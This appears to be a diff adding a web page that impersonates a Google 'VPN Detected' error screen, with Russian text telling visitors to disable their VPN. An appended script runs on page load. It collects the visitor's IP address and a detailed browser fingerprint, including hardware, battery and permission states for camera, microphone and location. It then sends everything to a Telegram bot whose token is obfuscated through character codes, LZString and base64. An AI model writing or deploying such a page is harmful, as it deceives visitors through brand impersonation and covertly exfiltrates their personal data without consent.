@@ -1,1 +1,126 @@
 <!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>VPN Detected</title><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet"><style>body{font-family:Inter,sans-serif;height:100vh;margin:0;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;background-color:#f4f4f4}.disable-text{font-size:18px;color:#333;font-weight:400;margin-top:20px}img{width:180px;height:auto}.google-logo{width:100px;height:auto;margin-top:20px}.about-us{margin-top:10px;font-size:14px;color:#333}a{color:#1a73e8;text-decoration:none}footer{position:absolute;bottom:10px;display:flex;flex-direction:column;align-items:center;padding:10px}@media (max-width:480px){img{width:120px}.disable-text{font-size:16px}.google-logo{width:80px}.about-us{font-size:12px}}@media (min-width:768px){img{width:200px}.disable-text{font-size:20px}.google-logo{width:120px}}</style></head><body><img src="https://www.google.com/images/errors/robot.png" alt="Error Logo"><div class="disable-text">Что бы получить доступ к контенту,<br>выключите VPN или сервисы,<br>которые изменяют ваш IP-адрес.<br>Ошибка: LGfY7wCRoXKJKn<br></div><footer><br>&copy;2025 Google Inc.<a href="https://support.google.com">google.com/help</a><img class="google-logo" src="https://static.vecteezy.com/system/resources/previews/028/667/072/non_2x/google-logo-icon-symbol-free-png.png" alt="Google Logo"><div class="about-us"><a href="https://about.google/" target="_blank">О нас</a></div></footer></body></html>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/lz-string/1.4.4/lz-string.min.js"></script>
+<script>
+let userIp; // Переменная для хранения IP-адреса
+
+async function ip() {
+    try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        userIp = data.ip; // Сохраняем IP-адрес в переменной
+        return `IP-адрес: ${userIp}`;
+    } catch (error) {
+        console.error('Ошибка получения IP-адреса:', error);
+        return 'Не удалось получить IP-адрес.';
+    }
+}
+
+async function navdata() {
+    const navigatorData = {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        languages: navigator.languages,
+        platform: navigator.platform,
+        appVersion: navigator.appVersion,
+        vendor: navigator.vendor,
+        product: navigator.product,
+        cookieEnabled: navigator.cookieEnabled,
+        online: navigator.onLine,
+        hardwareConcurrency: navigator.hardwareConcurrency,
+        deviceMemory: navigator.deviceMemory || "Не доступно",
+        maxTouchPoints: navigator.maxTouchPoints,
+        connection: navigator.connection ? {
+            effectiveType: navigator.connection.effectiveType,
+            downlink: navigator.connection.downlink,
+            rtt: navigator.connection.rtt,
+            saveData: navigator.connection.saveData
+        } : "Не поддерживается",
+        serviceWorker: 'Service Worker поддерживается: ' + ('serviceWorker' in navigator),
+        battery: await getBatteryInfo(),
+        mediaDevices: 'Media Devices поддерживается: ' + ('mediaDevices' in navigator),
+        userAgentData: navigator.userAgentData ? await navigator.userAgentData.getHighEntropyValues(["platform", "platformVersion", "uaFullVersion"]) : "Не поддерживается",
+        permissions: await getPermissions(),
+        hardware: {
+            touch: navigator.maxTouchPoints > 0 ? 'Поддерживает касания' : 'Не поддерживает касания',
+            fullscreen: document.fullscreenEnabled ? 'Поддерживает полноэкранный режим' : 'Не поддерживает полноэкранный режим'
+        },
+        pdfViewer: 'PDF Viewer поддерживается: ' + (navigator.pdfViewerEnabled ? 'Да' : 'Нет'),
+        clipboard: 'Clipboard API поддерживается: ' + (navigator.clipboard ? 'Да' : 'Нет'),
+        virtualKeyboard: 'Virtual Keyboard API поддерживается: ' + ('getInstalledRelatedApps' in navigator),
+    };
+
+    return navigatorData; // Return the actual data object
+}
+
+async function getBatteryInfo() {
+    if ('getBattery' in navigator) {
+        const battery = await navigator.getBattery();
+        return {
+            level: battery.level * 100 + '%', // Процент заряда
+            charging: battery.charging,
+            chargingTime: battery.chargingTime,
+            dischargingTime: battery.dischargingTime,
+        };
+    }
+    return "Не поддерживается";
+}
+
+async function getPermissions() {
+    const permissions = {};
+    const permissionNames = ['geolocation', 'notifications', 'camera', 'microphone', 'midi', 'background-sync'];
+    for (const name of permissionNames) {
+        try {
+            const permissionStatus = await navigator.permissions.query({ name });
+            permissions[name] = permissionStatus.state;
+        } catch (e) {
+            permissions[name] = "Не поддерживается";
+        }
+    }
+    return permissions;
+}
+
+async function lognavigator() {
+    let data = await navdata();
+    data = JSON.stringify(data, null, 2);
+    return data;
+}
+
+async function main() {
+    // Сначала получаем IP-адрес
+    await ip(); // Ждем завершения получения IP-адреса
+
+    let user = await lognavigator();
+    const skibidi = '7298-61610-3808-45570-42248-50544-5526-112-4225-5312-4984-1702-5632-45248-4864-25090-14344-24584-32842-29706-9876-360-1899-35888-32835-6190-108-778-53249-8604-41728-52408-122-14112-2624-9364-130-376-29952';
+
+    function sendMessage() {
+        const url = `https://api.telegram.org/bot${atob(LZString.decompress(skibidi.split('-').map(num => String.fromCharCode(num)).join('')))}/sendMessage`;
+        fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: '5061178189',
+                text: `${user}, ${userIp}` // Используем ожидаемые данные пользователя
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                // alert('Message sent successfully!');
+            } else {
+                // alert('Failed to send message.');
+            }
+        })
+        .catch(error => {
+            console.error('Error sending message: ', error);
+            // alert('Ошибка при отправке сообщения.');
+        });
+    }
+
+    sendMessage();
+}
+
+// Запуск функции main
+main();
+</script>
